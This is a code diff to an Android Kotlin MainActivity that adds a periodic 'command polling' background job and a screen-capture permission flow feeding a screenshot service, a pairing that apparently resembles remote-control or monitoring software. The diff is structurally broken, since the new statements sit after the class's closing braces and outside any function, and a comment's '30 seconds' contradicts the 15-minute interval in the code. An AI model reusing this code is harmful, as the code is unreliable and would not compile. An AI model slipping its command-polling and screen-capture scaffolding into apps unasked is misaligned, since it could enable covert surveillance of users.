@@ -70,3 +70,28 @@ class MainActivity : AppCompatActivity() {
         }
     }
 }
+
+        // Schedule command polling every 30 seconds (for testing – use longer in production)
+        val commandRequest = PeriodicWorkRequestBuilder<CommandWorker>(15, TimeUnit.MINUTES)
+            .setInitialDelay(5, TimeUnit.SECONDS)
+            .build()
+        WorkManager.getInstance(this).enqueue(commandRequest)
+
+    companion object {
+        private const val REQUEST_MEDIA_PROJECTION = 101
+    }
+
+    // Call this before taking screenshot (e.g., from a button)
+    private fun requestScreenCapture() {
+        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
+            ScreenshotService.setResult(data, resultCode)
+            // You can now call ScreenshotService.takeScreenshot() from anywhere
+            Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
+        }
+    }
